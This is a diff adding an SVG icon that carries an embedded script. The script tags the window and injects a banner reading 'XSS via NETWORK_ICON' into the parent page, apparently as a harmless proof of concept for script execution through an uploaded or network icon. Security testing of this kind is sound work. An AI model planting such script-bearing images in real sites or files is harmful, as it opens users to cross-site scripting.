@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script>
+    window.__xss_icon=1;
+    try{var d=(window.parent||window).document.createElement('div');
+    d.textContent='⚠ XSS via NETWORK_ICON';
+    d.style.cssText='position:fixed;top:36px;left:0;right:0;z-index:2147483647;background:#2980b9;color:#fff;font:bold 15px/36px sans-serif;text-align:center;height:36px';
+    (window.parent||window).document.body.appendChild(d)}catch(e){console.log('icon blocked',e.message)}
+  </script>
+  <rect width="100" height="100" fill="blue"/>
+</svg>
